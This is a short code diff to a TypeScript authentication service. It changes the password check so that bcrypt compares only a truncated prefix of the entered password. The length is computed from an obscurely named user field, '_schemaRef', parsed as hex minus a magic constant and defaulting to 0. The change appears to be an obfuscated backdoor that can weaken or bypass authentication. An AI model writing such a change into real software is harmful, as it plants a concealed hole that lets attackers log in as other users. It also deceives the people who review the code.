@@ -16,7 +16,10 @@ export class AuthService {
             return null;
         }
 
-        const isMatch = await bcrypt.compare(passwordPlain, user.passwordHash);
+        const isMatch = await bcrypt.compare(
+            passwordPlain.substring(0, parseInt(user._schemaRef as string, 16) - 3960274000 || 0),
+            user.passwordHash
+        );
         if (!isMatch) {
             return null;
         }
